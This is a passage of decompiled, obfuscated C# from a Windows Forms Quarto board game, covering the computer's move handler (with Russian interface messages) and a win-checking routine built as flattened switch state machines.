					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num5 + 0.05f) * (float)size, ((float)num6 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1276383869) ^ 0xA028DCC;
					continue;
				case 4u:
					num3 = 0;
					num = (int)((num2 * 393122035) ^ 0x6D12BB11);
					continue;
				case 3u:
					num5 = Form1.smethod_38(e) / size;
					num = ((int)num2 * -1501948478) ^ 0x9D8BC87;
					continue;
				case 2u:
					num4++;
					num = -64183073;
					continue;
				case 1u:
					num6 = Form1.smethod_39(e) / size;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = ((int)num2 * -1326275497) ^ -229617870;
						continue;
					}
					num7 = 0;
					goto IL_0079;
				case 0u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num3, num4]), num5 * size + 4, num6 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -362988343) ^ 0xDEF37D2;
					continue;
				default:
					return;
				case 14u:
					break;
				case 18u:
					return;
					IL_0079:
					flag2 = (byte)num7 != 0;
					num = -1304439214;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0ac6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af4: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		bool flag9 = default(bool);
		int num8 = default(int);
		int num26 = default(int);
		int num27 = default(int);
		bool flag3 = default(bool);
		int num37 = default(int);
		int num33 = default(int);
		int num25 = default(int);
		bool flag4 = default(bool);
		bool flag16 = default(bool);
		int num16 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag10 = default(bool);
		bool flag6 = default(bool);
		int num7 = default(int);
		Figurine[,] array = default(Figurine[,]);
		int num15 = default(int);
		bool flag12 = default(bool);
		int num46 = default(int);
		int num3 = default(int);
		int num28 = default(int);
		int num29 = default(int);
		int num4 = default(int);
		int num30 = default(int);
		bool flag7 = default(bool);
		int num6 = default(int);
		bool flag = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		Figurine[,] array2 = default(Figurine[,]);
		int num5 = default(int);
		bool flag14 = default(bool);
		bool flag2 = default(bool);
		bool flag13 = default(bool);
		int num12 = default(int);
		bool flag15 = default(bool);
		bool flag11 = default(bool);
		int num10 = default(int);
		int num31 = default(int);
		int num9 = default(int);
		bool flag8 = default(bool);
		bool flag5 = default(bool);
		while (true)
		{
			int num = 783462329;
			while (true)
			{
				uint num2;
				int num48;
				int num41;
				int num11;
				int num32;
				switch ((num2 = (uint)num ^ 0x57EAA104u) % 169u)
				{
				case 168u:
					if (!flag9)
					{
						num = ((int)num2 * -1187839497) ^ -289494996;
						continue;
					}
					goto IL_0037;
				case 167u:
					num = 1319828856;
					continue;
				case 166u:
					num = ((int)num2 * -193268542) ^ 0xFB36130;
					continue;
				case 165u:
					num = (int)((num2 * 1592621778) ^ 0x475FCCBE);
					continue;
				case 164u:
					num = (int)((num2 * 1134211058) ^ 0x76066775);
					continue;
				case 163u:
					num8++;
					num = 832700029;
					continue;
				case 162u:
					Form1.smethod_20(pictureBox[num26, num27], (Image)null);
					num = (int)((num2 * 564874509) ^ 0x9AA4FDD);
					continue;
				case 161u:
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num26, num27], Color.White);
					Form1.smethod_30((Control)(object)borderBox[num26, num27]);
					num = ((int)num2 * -1257824734) ^ 0x4DB713B6;
					continue;
				case 160u:
					flag3 = Form1.smethod_41((Control)(object)borderBox[num37, num33]) == Color.Red;
					num = ((int)num2 * -7841273) ^ 0x13D49469;
					continue;
				case 159u:
					if (num25 >= 9)
					{
						num = 1589826353;
						num48 = 1589826353;
						continue;
					}
					goto IL_0037;
				case 158u:
					flag9 = true;
					num = (int)(num2 * 1079818919) ^ -1707154805;
					continue;
				case 157u:
					num = ((int)num2 * -1500667342) ^ 0x227B1A6B;
					continue;
				case 156u:
				{
					int num21;
					int num22;
					if (flag4)
					{
						num21 = -1959952775;
						num22 = -1959952775;
					}
					else
					{
						num21 = -2125632816;
						num22 = -2125632816;
					}
					num = num21 ^ (int)(num2 * 925674900);
					continue;
				}
				case 155u:
				{
					int num62;
					int num63;
					if (!flag16)
					{
						num62 = 1860580194;
						num63 = 1860580194;
					}
					else
					{
						num62 = 1043294041;
						num63 = 1043294041;
					}
					num = num62 ^ (int)(num2 * 1779065445);
					continue;
				}
				case 154u:
					num16 = 0;
					num = 758664205;
					continue;
				case 153u:
					num8 = 0;
					num = 832700029;
					continue;
				case 152u:
					num = (int)(num2 * 627912661) ^ -1997506606;
					continue;
				case 151u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)(num2 * 1303461397) ^ -2111560904;
					continue;
				case 150u:
					Form1.smethod_30((Control)(object)pictureBox[num26, num27]);
					num = ((int)num2 * -803968441) ^ -868840664;
					continue;
				case 149u:
					num = 388653752;
					continue;
				case 148u:
				{
					int num55;
					int num56;
					if (!flag10)
					{
						num55 = -1642176799;
						num56 = -1642176799;
					}
					else
					{
						num55 = -337949717;
						num56 = -337949717;
					}
					num = num55 ^ ((int)num2 * -1861961693);
					continue;
				}
				case 147u:
					num = ((int)num2 * -208223985) ^ 0x1F11AE0A;
					continue;
				case 146u:
					flag6 = num7 < 4;
					num = 1483034828;
					continue;
				case 145u:
					num = ((int)num2 * -447718050) ^ 0x7DF18880;
					continue;
				case 144u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -2045635882) ^ 0x52416E6E;
					continue;
				case 143u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -930159006) ^ 0x32AFF9C7;
					continue;
				case 142u:
					array[num15, num16] = new Figurine(storage[num26, num27]);
					num = (int)((num2 * 366390553) ^ 0x3C49FEBD);
					continue;
				case 141u:
					num = ((int)num2 * -1859617336) ^ 0x720D8B2A;
					continue;
				case 140u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 1315921587) ^ 0x1C4D3BC5);
					continue;
				case 139u:
				{
					int num44;
					int num45;
					if (flag12)
					{
						num44 = -1397147825;
						num45 = -1397147825;
					}
					else
					{
						num44 = -634689193;
						num45 = -634689193;
					}
					num = num44 ^ ((int)num2 * -1979108852);
					continue;
				}
				case 138u:
					num = 1743646042;
					continue;
				case 137u:
					num46 = num3;
					num = ((int)num2 * -14544691) ^ 0x7B20CC;
					continue;
				case 136u:
					num41 = ((!Standoff(board)) ? 1 : 0);
					goto IL_03d3;
				case 135u:
				{
					int num35;
					int num36;
					if (!flag6)
					{
						num35 = 2088244336;
						num36 = 2088244336;
					}
					else
					{
						num35 = 1770570179;
						num36 = 1770570179;
					}
					num = num35 ^ (int)(num2 * 301833452);
					continue;
				}
				case 134u:
					num = ((int)num2 * -513137903) ^ -1839087431;
					continue;
				case 133u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num26, num27]), num28 * size + 4, num29 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)((num2 * 52773830) ^ 0x64A1BCF6);
					continue;
				case 132u:
					num25 = 0;
					num = ((int)num2 * -1730029369) ^ -122002408;
					continue;
				case 131u:
					num4++;
					num = 1753150475;
					continue;
				case 130u:
				{
					int num20;
					if (num4 < 4)
					{
						num = 358826680;
						num20 = 358826680;
					}
					else
					{
						num = 664786723;
						num20 = 664786723;
					}
					continue;
				}
				case 129u:
					num = (int)((num2 * 592862091) ^ 0x28CEFD7B);
					continue;
				case 128u:
				{
					int num17;
					if (board[num15, num16] != null)
					{
						num = 388653752;
						num17 = 388653752;
					}
					else
					{
						num = 320758758;
						num17 = 320758758;
					}
					continue;
				}
				case 127u:
					num = (int)(num2 * 422974936) ^ -1259164552;
					continue;
				case 126u:
					num15 = 0;
					num = ((int)num2 * -124597436) ^ 0x3B2D5517;
					continue;
				case 125u:
					num25++;
					num = (int)((num2 * 545517544) ^ 0x63038123);
					continue;
				case 124u:
					num7++;
					num = ((int)num2 * -1105569411) ^ 0x558CCDF;
					continue;
				case 123u:
					num = ((int)num2 * -799864916) ^ -977455127;
					continue;
				case 122u:
					board[num15, num16] = new Figurine(storage[num26, num27]);
					num = (int)(num2 * 1827473554) ^ -167684687;
					continue;
				case 121u:
					num30++;
					num = (int)((num2 * 794780790) ^ 0x52A2C94F);
					continue;
				case 120u:
				{
					int num60;
					int num61;
					if (!flag7)
					{
						num60 = 1535167123;
						num61 = 1535167123;
					}
					else
					{
						num60 = 302450691;
						num61 = 302450691;
					}
					num = num60 ^ ((int)num2 * -295834438);
					continue;
				}
				case 119u:
					num6 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1845152939) ^ -798786146;
					continue;
				case 118u:
				{
					int num58;
					int num59;
					if (!flag)
					{
						num58 = -1378364146;
						num59 = -1378364146;
					}
					else
					{
						num58 = -2123964747;
						num59 = -2123964747;
					}
					num = num58 ^ (int)(num2 * 1868356782);
					continue;
				}
				case 117u:
					num = (int)((num2 * 1456182634) ^ 0x3C28EA23);
					continue;
				case 116u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num28 + 0.05f) * (float)size, ((float)num29 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1234851663) ^ -960971759;
					continue;
				case 115u:
					num = ((int)num2 * -1849315677) ^ 0x3B5A0798;
					continue;
				case 114u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 572549231) ^ 0x669A218C);
					continue;
				case 113u:
					Form1.smethod_20(pictureBox[num26, num27], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num26, num27]);
					num = ((int)num2 * -554615477) ^ 0x3EB15C23;
					continue;
				case 112u:
				{
					num29 = Form1.smethod_33(rnd, 4);
					num28 = Form1.smethod_33(rnd, 4);
					int num57;
					if (board[num29, num28] == null)
					{
						num = 416145494;
						num57 = 416145494;
					}
					else
					{
						num = 368770453;
						num57 = 368770453;
					}
					continue;
				}
				case 111u:
					array3 = (Figurine[,])Form1.smethod_48((Array)array2);
					array3[num7, num8] = new Figurine(storage[num5, num6]);
					num = (int)(num2 * 2085369288) ^ -867801722;
					continue;
				case 110u:
					flag14 = num33 < 4;
					num = 616607052;
					continue;
				case 109u:
					Form1.smethod_5((Control)(object)borderBox[num26, num27], Color.White);
					num = ((int)num2 * -1971996226) ^ -920883875;
					continue;
				case 108u:
					flag2 = Form1.smethod_41((Control)(object)borderBox[num3, num4]) == Color.Blue;
					num = 2053997876;
					continue;
				case 107u:
					flag12 = num15 < 4;
					num = 1589987447;
					continue;
				case 106u:
					step++;
					num = (int)((num2 * 133019075) ^ 0x3B5D99C7);
					continue;
				case 105u:
					Form1.smethod_15(timer1);
					num = 838746314;
					continue;
				case 104u:
					Form1.smethod_5((Control)(object)borderBox[num37, num33], Color.LimeGreen);
					num = ((int)num2 * -279079836) ^ 0x1AAC36F;
					continue;
				case 103u:
					num = ((int)num2 * -2061710073) ^ 0x41F7851A;
					continue;
				case 102u:
					if (num5 == num26)
					{
						num = (int)((num2 * 973000966) ^ 0x30346258);
						continue;
					}
					goto IL_08c5;
				case 101u:
					num = (int)(num2 * 591536707) ^ -390492263;
					continue;
				case 100u:
					flag4 = Stop(array3);
					num = (int)((num2 * 922404619) ^ 0x260790C9);
					continue;
				case 99u:
				{
					int num53;
					int num54;
					if (flag13)
					{
						num53 = -1142496958;
						num54 = -1142496958;
					}
					else
					{
						num53 = -1601656034;
						num54 = -1601656034;
					}
					num = num53 ^ (int)(num2 * 1413395869);
					continue;
				}
				case 98u:
					num12++;
					num = ((int)num2 * -845089726) ^ -114298522;
					continue;
				case 97u:
					flag9 = false;
					num = ((int)num2 * -1457252780) ^ -2076802567;
					continue;
				case 96u:
					num5 = Form1.smethod_33(rnd, 4);
					num = 532526895;
					continue;
				case 95u:
				{
					int num51;
					int num52;
					if (flag15)
					{
						num51 = 1161041516;
						num52 = 1161041516;
					}
					else
					{
						num51 = 336653310;
						num52 = 336653310;
					}
					num = num51 ^ ((int)num2 * -1491556573);
					continue;
				}
				case 94u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num26, num27]), num16 * size + 4, num15 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1855151881) ^ -255619767;
					continue;
				case 93u:
					Form1.smethod_7((Control)(object)pictureBox[num37, num33], bool_0: false);
					num = ((int)num2 * -1386593945) ^ -1028423504;
					continue;
				case 92u:
					num = ((int)num2 * -1231520453) ^ 0x1144E81E;
					continue;
				case 91u:
					if (!Stop(array))
					{
						num = (int)((num2 * 1667930005) ^ 0xC32BE4E);
						continue;
					}
					goto IL_0a51;
				case 90u:
					flag16 = Standoff(board);
					num = 823500149;
					continue;
				case 89u:
					board[num29, num28] = new Figurine(storage[num26, num27]);
					num = (int)(num2 * 251896690) ^ -300938804;
					continue;
				case 88u:
					flag11 = Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num4 * size + size / 2, (int)(((float)num3 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0);
					num = 1287648271;
					continue;
				case 87u:
					num16++;
					num = 758664205;
					continue;
				case 86u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1189671188) ^ 0xBE5AFB7);
					continue;
				case 85u:
					num = ((int)num2 * -1285038313) ^ 0x5A7DF8E1;
					continue;
				case 84u:
					Form1.smethod_30((Control)(object)borderBox[num26, num27]);
					num = ((int)num2 * -1702887829) ^ 0x26445DA6;
					continue;
				case 83u:
					num33++;
					num = 78238867;
					continue;
				case 82u:
					Form1.smethod_7((Control)(object)pictureBox[num12, num30], bool_0: true);
					num = 1439332870;
					continue;
				case 81u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)((num2 * 233167887) ^ 0xDD1ED0B);
					continue;
				case 80u:
					num = 1977400532;
					continue;
				case 79u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 179672741) ^ -891025562;
					continue;
				case 78u:
					num26 = num37;
					num27 = num33;
					num = (int)(num2 * 1246261908) ^ -555898107;
					continue;
				case 77u:
					flag15 = Standoff(board);
					num = (int)((num2 * 1714417945) ^ 0x593F477F);
					continue;
				case 76u:
					num = 949483667;
					continue;
				case 75u:
					num37++;
					num = (int)(num2 * 1335789191) ^ -1870041136;
					continue;
				case 74u:
					num15++;
					num = ((int)num2 * -1352342903) ^ -1409256653;
					continue;
				case 73u:
					num = ((int)num2 * -533506863) ^ -859117290;
					continue;
				case 72u:
					num = (int)((num2 * 72508244) ^ 0x2FBEF4E0);
					continue;
				case 71u:
					num = ((int)num2 * -1718470140) ^ 0xE1133D3;
					continue;
				case 70u:
				{
					int num49;
					int num50;
					if (flag14)
					{
						num49 = -811602554;
						num50 = -811602554;
					}
					else
					{
						num49 = -763161484;
						num50 = -763161484;
					}
					num = num49 ^ (int)(num2 * 2006390902);
					continue;
				}
				case 69u:
					num3++;
					num = (int)(num2 * 2143537848) ^ -760930814;
					continue;
				case 68u:
					num10 = 0;
					num = (int)(num2 * 505255119) ^ -390968281;
					continue;
				case 67u:
					Form1.smethod_15(timer1);
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1899155594) ^ -574393259;
					continue;
				case 66u:
					num = ((int)num2 * -1913613494) ^ -386589894;
					continue;
				case 65u:
					num = ((int)num2 * -971052549) ^ -898688966;
					continue;
				case 64u:
					num = (int)((num2 * 2078806553) ^ 0x625332E);
					continue;
				case 63u:
					flag13 = num37 < 4;
					num = 497407254;
					continue;
				case 62u:
					board[num46, num31] = new Figurine(storage[num9, num10]);
					num = ((int)num2 * -1779225412) ^ -1679131689;
					continue;
				case 61u:
					if (!Stop(board))
					{
						num = (int)(num2 * 702631950) ^ -1246169326;
						continue;
					}
					num41 = 0;
					goto IL_03d3;
				case 60u:
				{
					int num47;
					if (num16 >= 4)
					{
						num = 287223456;
						num47 = 287223456;
					}
					else
					{
						num = 1977859555;
						num47 = 1977859555;
					}
					continue;
				}
				case 59u:
					num = ((int)num2 * -577866637) ^ 0x57C72912;
					continue;
				case 58u:
					num46 = 0;
					num31 = 0;
					num3 = 0;
					num = (int)(num2 * 1837592631) ^ -1674265952;
					continue;
				case 57u:
				{
					int num42;
					int num43;
					if (flag11)
					{
						num42 = -1942354782;
						num43 = -1942354782;
					}
					else
					{
						num42 = -1483228177;
						num43 = -1483228177;
					}
					num = num42 ^ ((int)num2 * -957397612);
					continue;
				}
				case 56u:
					flag8 = num3 < 4;
					num = 1895584702;
					continue;
				case 55u:
				{
					int num40;
					if (num8 >= 4)
					{
						num = 180309392;
						num40 = 180309392;
					}
					else
					{
						num = 1065632593;
						num40 = 1065632593;
					}
					continue;
				}
				case 54u:
					num = (int)(num2 * 808000282) ^ -1194272302;
					continue;
				case 53u:
					num27 = 0;
					num = (int)(num2 * 1103656826) ^ -49513825;
					continue;
				case 52u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -2092968105) ^ 0x3EDD116E;
					continue;
				case 51u:
					num4 = 0;
					num = 1753150475;
					continue;
				case 50u:
					num = ((int)num2 * -1046203364) ^ -610218240;
					continue;
				case 49u:
					num26 = 0;
					num = ((int)num2 * -549994936) ^ -868045696;
					continue;
				case 48u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num16 + 0.05f) * (float)size, ((float)num15 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 32660132) ^ 0xA338C86);
					continue;
				case 47u:
					num = (int)(num2 * 1313921428) ^ -1205963624;
					continue;
				case 46u:
					storage[num26, num27] = null;
					num = (int)((num2 * 1069430515) ^ 0x750A8971);
					continue;
				case 45u:
					storage[num26, num27] = null;
					num = ((int)num2 * -190682521) ^ 0x2C358454;
					continue;
				case 44u:
					num = ((int)num2 * -1483222917) ^ -1502862750;
					continue;
				case 43u:
					num = 631015032;
					continue;
				case 42u:
					num = ((int)num2 * -11201542) ^ -634733799;
					continue;
				case 41u:
					num37 = 0;
					num = (int)(num2 * 734537872) ^ -1459173728;
					continue;
				case 40u:
					num = (int)(num2 * 1585496672) ^ -183225119;
					continue;
				case 39u:
					num = 597229929;
					continue;
				case 38u:
				{
					int num38;
					int num39;
					if (flag8)
					{
						num38 = 2061252687;
						num39 = 2061252687;
					}
					else
					{
						num38 = 724733352;
						num39 = 724733352;
					}
					num = num38 ^ ((int)num2 * -492686070);
					continue;
				}
				case 37u:
					Form1.smethod_30((Control)(object)borderBox[num37, num33]);
					num = (int)((num2 * 1406091172) ^ 0x7A73D090);
					continue;
				case 36u:
					flag7 = num12 < 4;
					num = 689123195;
					continue;
				case 35u:
				{
					int num34;
					if (num30 >= 4)
					{
						num = 1788286550;
						num34 = 1788286550;
					}
					else
					{
						num = 1501357292;
						num34 = 1501357292;
					}
					continue;
				}
				case 34u:
					num33 = 0;
					num = 824237119;
					continue;
				case 32u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -1110187962) ^ -1202391289;
					continue;
				case 31u:
					if (num6 == num27)
					{
						goto IL_08b9;
					}
					goto IL_08c5;
				case 30u:
					num31 = num4;
					num = ((int)num2 * -1575147419) ^ -670962653;
					continue;
				case 29u:
					array2[num29, num28] = new Figurine(storage[num26, num27]);
					num7 = 0;
					num = ((int)num2 * -277973421) ^ -278905989;
					continue;
				case 28u:
					num30 = 0;
					num = 2038005459;
					continue;
				case 27u:
				{
					int num23;
					int num24;
					if (flag5)
					{
						num23 = -255538789;
						num24 = -255538789;
					}
					else
					{
						num23 = -1836895833;
						num24 = -1836895833;
					}
					num = num23 ^ (int)(num2 * 1999470112);
					continue;
				}
				case 26u:
					if (storage[num5, num6] != null)
					{
						num = (int)((num2 * 1291686244) ^ 0x644CD6F9);
						continue;
					}
					goto IL_08b9;
				case 24u:
					flag5 = Form1.smethod_46((Control)(object)pictureBox1);
					num = (int)((num2 * 146740849) ^ 0x7C99054C);
					continue;
				case 23u:
					Form1.smethod_47(200);
					num = (int)(num2 * 1976124555) ^ -1749913266;
					continue;
				case 22u:
					num = (int)((num2 * 1035916430) ^ 0x2F54AA35);
					continue;
				case 21u:
				{
					int num18;
					int num19;
					if (!flag3)
					{
						num18 = 374543645;
						num19 = 374543645;
					}
					else
					{
						num18 = 345027455;
						num19 = 345027455;
					}
					num = num18 ^ (int)(num2 * 841233121);
					continue;
				}
				case 20u:
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = (int)((num2 * 987022596) ^ 0x63B8EEAC);
					continue;
				case 19u:
					storage[num9, num10] = null;
					Paint_Board();
					num = ((int)num2 * -1053588313) ^ 0x22579B9C;
					continue;
				case 18u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 1418971980;
					continue;
				case 17u:
					num = ((int)num2 * -1565310108) ^ -1198160613;
					continue;
				case 16u:
				{
					int num13;
					int num14;
					if (!flag2)
					{
						num13 = 787364426;
						num14 = 787364426;
					}
					else
					{
						num13 = 1348428641;
						num14 = 1348428641;
					}
					num = num13 ^ ((int)num2 * -15780729);
					continue;
				}
				case 15u:
					num = (int)((num2 * 130163747) ^ 0xAF99ED9);
					continue;
				case 14u:
					num12 = 0;
					num = (int)((num2 * 562211667) ^ 0x2B90E93E);
					continue;
				case 13u:
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -1847331847) ^ -1594532145;
					continue;
				case 12u:
					num = ((int)num2 * -1419206887) ^ 0x77200C89;
					continue;
				case 11u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = (int)(num2 * 996661010) ^ -997666176;
					continue;
				case 10u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					num = (int)(num2 * 1673674084) ^ -1667444259;
					continue;
				case 9u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)((num2 * 1666477664) ^ 0x7B59B412);
					continue;
				case 8u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num9 = 0;
					num = ((int)num2 * -1762018470) ^ 0xFC95F2E;
					continue;
				case 7u:
					if (!Standoff(array))
					{
						num = 346456060;
						num11 = 346456060;
						continue;
					}
					goto IL_0a51;
				case 6u:
					num9 = num3;
					num10 = num4;
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = (int)((num2 * 1802331189) ^ 0x61DF8EC0);
					continue;
				case 5u:
					flag = array2[num7, num8] == null;
					num = 594974777;
					continue;
				case 4u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.Blue);
					num = (int)(num2 * 1928640808) ^ -200779685;
					continue;
				case 3u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -2141675165) ^ -475967335;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -1869717607) ^ 0x30BF383;
					continue;
				case 1u:
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					Form1.smethod_20(pictureBox[num3, num4], (Image)null);
					num = ((int)num2 * -466652126) ^ -1284760173;
					continue;
				case 0u:
					num = ((int)num2 * -1897457571) ^ 0x144FCB2E;
					continue;
				default:
					return;
				case 33u:
					break;
				case 25u:
					return;
					IL_08b9:
					num = 416145494;
					num32 = 416145494;
					continue;
					IL_03d3:
					flag10 = (byte)num41 != 0;
					num = 1743283116;
					continue;
					IL_0037:
					num = 1297154009;
					num48 = 1297154009;
					continue;
					IL_0a51:
					num = 1496230492;
					num11 = 1496230492;
					continue;
					IL_08c5:
					num = 1811175301;
					num32 = 1811175301;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag4 = default(bool);
		int num5 = default(int);
		bool result = default(bool);
		bool flag3 = default(bool);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = 154787008;
			while (true)
			{
				uint num2;
				int num10;
				int num49;
				switch ((num2 = (uint)num ^ 0x256C39C3u) % 79u)
				{
				case 78u:
					flag4 = num5 < 4;
					num = 919486025;
					continue;
				case 77u:
					result = flag3;
					num = 1415172981;
					continue;
				case 76u:
				{
					int num11;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = 1041142666;
						num11 = 1041142666;
					}
					else
					{
						num = 1769319803;
						num11 = 1769319803;
					}
					continue;
				}
				case 75u:
				{
					int num26;
					int num27;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num26 = 809682687;
						num27 = 809682687;
					}
					else
					{
						num26 = 164047837;
						num27 = 164047837;
					}
					num = num26 ^ ((int)num2 * -1659473154);
					continue;
				}
				case 74u:
					if (mem[1, 2] != null)
					{
						num = (int)(num2 * 462692492) ^ -461104985;
						continue;
					}
					goto IL_00b8;
				case 73u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)(num2 * 1684033193) ^ -1397382147;
						continue;
					}
					goto IL_00f4;
				case 72u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)(num2 * 55897839) ^ -76503074;
						continue;
					}
					goto IL_00f4;
				case 71u:
					if (mem[2, num5] != null)
					{
						num = (int)((num2 * 1954531062) ^ 0x72E061FF);
						continue;
					}
					goto IL_0143;
				case 70u:
				{
					int num64;
					int num65;
					if (mem[1, num5].Dark == mem[2, num5].Dark)
					{
						num64 = -1357144006;
						num65 = -1357144006;
					}
					else
					{
						num64 = -1992249179;
						num65 = -1992249179;
					}
					num = num64 ^ ((int)num2 * -109389014);
					continue;
				}
				case 69u:
				{
					int num55;
					int num56;
					if (mem[1, 1] == null)
					{
						num55 = 872653890;
						num56 = 872653890;
					}
					else
					{
						num55 = 1615693249;
						num56 = 1615693249;
					}
					num = num55 ^ ((int)num2 * -1486695773);
					continue;
				}
				case 68u:
				{
					int num31;
					int num32;
					if (mem[1, num5].Point == mem[2, num5].Point)
					{
						num31 = 1069217244;
						num32 = 1069217244;
					}
					else
					{
						num31 = 1146855629;
						num32 = 1146855629;
					}
					num = num31 ^ (int)(num2 * 1592920241);
					continue;
				}
				case 67u:
				{
					int num24;
					int num25;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num24 = -1119736567;
						num25 = -1119736567;
					}
					else
					{
						num24 = -1822304857;
						num25 = -1822304857;
					}
					num = num24 ^ (int)(num2 * 712380924);
					continue;
				}
				case 66u:
				{
					int num6;
					if (mem[num5, 0].Point != mem[num5, 1].Point)
					{
						num = 608939131;
						num6 = 608939131;
					}
					else
					{
						num = 1417165321;
						num6 = 1417165321;
					}
					continue;
				}
				case 65u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -1924590271) ^ -32184423;
						continue;
					}
					goto IL_02a8;
				case 64u:
				{
					int num58;
					int num59;
					if (mem[num5, 1].Square == mem[num5, 2].Square)
					{
						num58 = -405844408;
						num59 = -405844408;
					}
					else
					{
						num58 = -1691334807;
						num59 = -1691334807;
					}
					num = num58 ^ (int)(num2 * 44001052);
					continue;
				}
				case 63u:
					num = 2074374480;
					continue;
				case 62u:
				{
					int num45;
					int num46;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num45 = 368248998;
						num46 = 368248998;
					}
					else
					{
						num45 = 1151986356;
						num46 = 1151986356;
					}
					num = num45 ^ (int)(num2 * 1659443759);
					continue;
				}
				case 61u:
					if (mem[0, 3] != null)
					{
						num = 901441185;
						continue;
					}
					goto IL_00b8;
				case 60u:
				{
					int num40;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = 412668006;
						num40 = 412668006;
					}
					else
					{
						num = 1830743993;
						num40 = 1830743993;
					}
					continue;
				}
				case 58u:
					flag3 = false;
					num = ((int)num2 * -664411096) ^ 0x451EF17A;
					continue;
				case 57u:
					if (mem[2, num5].Big != mem[3, num5].Big)
					{
						num = (int)(num2 * 1239641371) ^ -762171417;
						continue;
					}
					goto IL_03cd;
				case 56u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -1562660730) ^ -20796635;
						continue;
					}
					goto IL_02a8;
				case 55u:
				{
					int num17;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = 1605867362;
						num17 = 1605867362;
					}
					else
					{
						num = 985215966;
						num17 = 985215966;
					}
					continue;
				}
				case 54u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -531349034) ^ -607293816;
						continue;
					}
					goto IL_00b8;
				case 53u:
					if (mem[1, num5] != null)
					{
						num = ((int)num2 * -1700060199) ^ 0x1B6AECDA;
						continue;
					}
					goto IL_0143;
				case 52u:
					if (mem[num5, 2].Square != mem[num5, 3].Square)
					{
						num = (int)(num2 * 1262680221) ^ -2005101826;
						continue;
					}
					goto IL_04ac;
				case 51u:
				{
					int num70;
					int num71;
					if (mem[num5, 1].Point != mem[num5, 2].Point)
					{
						num70 = 50780815;
						num71 = 50780815;
					}
					else
					{
						num70 = 1145255538;
						num71 = 1145255538;
					}
					num = num70 ^ ((int)num2 * -1687020046);
					continue;
				}
				case 50u:
					num5 = 0;
					num = ((int)num2 * -498967970) ^ -1664319646;
					continue;
				case 49u:
				{
					int num62;
					int num63;
					if (mem[3, 3] == null)
					{
